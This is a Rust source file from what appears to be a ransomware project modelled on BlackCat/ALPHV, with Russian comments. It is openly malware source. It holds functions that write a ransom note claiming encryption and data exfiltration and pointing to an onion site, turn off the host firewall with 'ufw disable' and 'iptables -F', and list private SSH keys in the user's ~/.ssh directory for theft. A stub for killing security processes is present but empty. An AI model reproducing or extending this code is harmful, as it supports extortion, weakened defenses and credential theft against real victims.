// src/linux.rs
use std::process::Command;

pub struct LinuxOperations;

impl LinuxOperations {
    #[cfg(target_os = "linux")]
    pub fn create_ransom_note(save_dir: &str, exfil_report: &str) -> Result<(), String> {
        let ransom_content = format!(
r#"-->> BLACKCAT/ALPHV RANSOMWARE <<--

Your important files have been ENCRYPTED and now have ".sttp" extension.

YOUR DATA HAS BEEN EXFILTRATED!
All sensitive data from your system has been downloaded to our servers.

EXFILTRATED DATA REPORT:
{}

Recovery procedure:
1. Download and install Tor Browser: https://torproject.org/
2. Navigate to: http://blackcat-site.onion/
3. Enter your personal decryption key provided below.

=== DO NOT SHARE THIS KEY WITH ANYONE ===
"#, exfil_report);

        let note_path = format!("{}/README_BLACKCAT.txt", save_dir);
        std::fs::write(&note_path, ransom_content)
            .map_err(|e| format!("Failed to create ransom note: {}", e))?;
        Ok(())
    }

    #[cfg(target_os = "linux")]
    pub fn disable_firewall() -> Result<(), String> {
        // Пробуем ufw
        let _ = Command::new("ufw").arg("disable").output();
        // Пробуем iptables flush
        let _ = Command::new("iptables").arg("-F").output();
        Ok(())
    }

    #[cfg(target_os = "linux")]
    pub fn kill_security_processes() -> Result<(), String> {
        // Упрощенная версия, можно добавить pkill
        Ok(())
    }

    #[cfg(target_os = "linux")]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> {
        // Ищем ключи в стандартных местах
        let mut keys = Vec::new();
        let home = std::env::var("HOME").unwrap_or_else(|_| "/root".to_string());
        let ssh_dir = format!("{}/.ssh", home);
        
        if let Ok(entries) = std::fs::read_dir(ssh_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let name = path.file_name().unwrap().to_string_lossy();
                    if name.starts_with("id_") && !name.ends_with(".pub") {
                        keys.push(path.to_string_lossy().to_string());
                    }
                }
            }
        }
        Ok(keys)
    }

    // --- ЗАГЛУШКИ ДЛЯ WINDOWS (чтобы не ломалась кросс-компиляция) ---
    #[cfg(not(target_os = "linux"))]
    pub fn create_ransom_note(_: &str, _: &str) -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "linux"))]
    pub fn disable_firewall() -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "linux"))]
    pub fn kill_security_processes() -> Result<(), String> { Ok(()) }
    #[cfg(not(target_os = "linux"))]
    pub fn enumerate_ssh_keys() -> Result<Vec<String>, String> { Ok(Vec::new()) }
}